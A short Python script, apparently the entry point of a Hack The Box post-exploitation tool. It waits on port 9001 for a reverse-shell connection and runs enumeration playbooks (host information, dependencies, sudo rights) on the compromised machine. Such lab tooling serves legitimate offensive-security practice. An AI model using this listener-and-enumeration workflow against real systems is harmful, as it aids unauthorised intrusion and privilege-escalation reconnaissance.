import pwn
import pheelshell
import playbooks.enumerate.basic_host_information
import playbooks.enumerate.dependencies
import playbooks.enumerate.sudo_list
import utilities

LISTENING_PORT = 9001

def main():
    # Picks the local IP for HTB. Give the option to the user in the future.
    attacker_ip = None
    ipv4s = utilities.fetch_ipv4_addresses()
    for ipv4 in ipv4s:
        if ipv4.startswith('10.10.14'):
            attacker_ip = ipv4
            break

    active_playbooks = [
        playbooks.enumerate.dependencies.EnumerateDependencies(),
        playbooks.enumerate.basic_host_information.EnumerateBasicHostInformation(),
        playbooks.enumerate.sudo_list.EnumerateSudoList()
    ]

    print(f'Listening {attacker_ip}:{LISTENING_PORT}...')
    with pwn.listen(LISTENING_PORT).wait_for_connection() as client:
        shell = pheelshell.PheelShell(client, b'$ ', attacker_ip)

        for playbook in active_playbooks:
            shell.run_playbook(playbook)

    for playbook in active_playbooks:
        print(str(playbook))

if __name__ == '__main__':
    main()
